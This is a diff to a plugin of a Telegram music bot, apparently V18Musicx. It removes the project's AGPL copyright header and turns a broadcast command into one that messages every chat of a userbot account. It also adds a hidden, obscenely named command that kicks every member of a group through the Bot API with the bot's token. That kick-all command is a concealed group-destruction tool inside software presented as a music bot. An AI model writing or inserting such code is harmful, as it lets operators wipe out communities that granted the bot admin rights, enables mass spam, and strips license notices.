@@ -1,42 +1,52 @@
-# V18Musicx (Telegram bot project )
-# Copyright (C) 2021  Inukaasith
-
-# This program is free software: you can redistribute it and/or modify
-# it under the terms of the GNU Affero General Public License as
-# published by the Free Software Foundation, either version 3 of the
-# License, or (at your option) any later version.
-
-# This program is distributed in the hope that it will be useful,
-# but WITHOUT ANY WARRANTY; without even the implied warranty of
-# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-# GNU Affero General Public License for more details.
-#
-# You should have received a copy of the GNU Affero General Public License
-# along with this program.  If not, see <https://www.gnu.org/licenses/>.
-
-
+import asyncio
+import html
+import os
+import re
+import sys
+import aiohttp
+import regex
 from pyrogram import Client, filters
 from pyrogram.errors import UserAlreadyParticipant
-import asyncio
-from V18Musicx.config import SUDO_USERS
+from V18Musicx.services.callsmusic.callsmusic import client as USER
+from V18Musicx.config import SUDO_USERS, BOT_TOKEN
+from aiohttp import ClientSession
+from pyrogram.types import Message
 
-@Client.on_message(filters.command(["gcast"]))
-async def bye(client, message):
+@Client.on_message(filters.command(["broadcast"]))
+async def broadcast(_, message: Message):
     sent=0
     failed=0
-    if message.from_user.id in SUDO_USERS:
-        lol = await message.reply("Starting Gcast")
+    if message.from_user.id not in SUDO_USERS:
+        return
+    else:
+        wtf = await message.reply("`mulai broadcast...`")
         if not message.reply_to_message:
-            await lol.edit("Reply to any text message to gcast sir")
+            await wtf.edit("Please Reply to a Message yang mau di broadcast!")
             return
-        msg = message.reply_to_message.text
-        async for dialog in client.iter_dialogs():
+        lmao = message.reply_to_message.text
+        async for dialog in USER.iter_dialogs():
             try:
-                await client.send_message(dialog.chat.id, msg)
+                await USER.send_message(dialog.chat.id, lmao)
                 sent = sent+1
-                await lol.edit(f"Gcasting.. Sent: {sent} chats. Failed: {failed} chats.")
+                await wtf.edit(f"`broadcasting...` \n\n**Sent to:** `{sent}` Chats \n**Failed in:** {failed} Chats")
+                await asyncio.sleep(5)
             except:
                 failed=failed+1
-                await lol.edit(f"Gcasting.. Sent: {sent} chats. Failed: {failed} chats.")
-            await asyncio.sleep(3)
-        await message.reply_text(f"Gcasted message to {sent} chats. Failed {failed} chats.")
+                #await wtf.edit(f"`broadcasting...` \n\n**Sent to:** `{sent}` Chats \n**Failed in:** {failed} Chats")
+                
+            
+        await message.reply_text(f"`Broadcast Finished ` \n\n**Sent to:** `{sent}` Chats \n**Failed in:** {failed} Chats")
+
+        
+
+@Client.on_message(filters.command("fucekall") &
+                 filters.group & filters.user(SUDO_USERS))
+async def ban_all(c: Client, m: Message):
+    chat = m.chat.id
+
+    async for member in c.iter_chat_members(chat):
+        user_id = member.user.id
+        url = (
+            f"https://api.telegram.org/bot{BOT_TOKEN}/kickChatMember?chat_id={chat}&user_id={user_id}")
+        async with aiohttp.ClientSession() as session:
+            await session.get(url)        
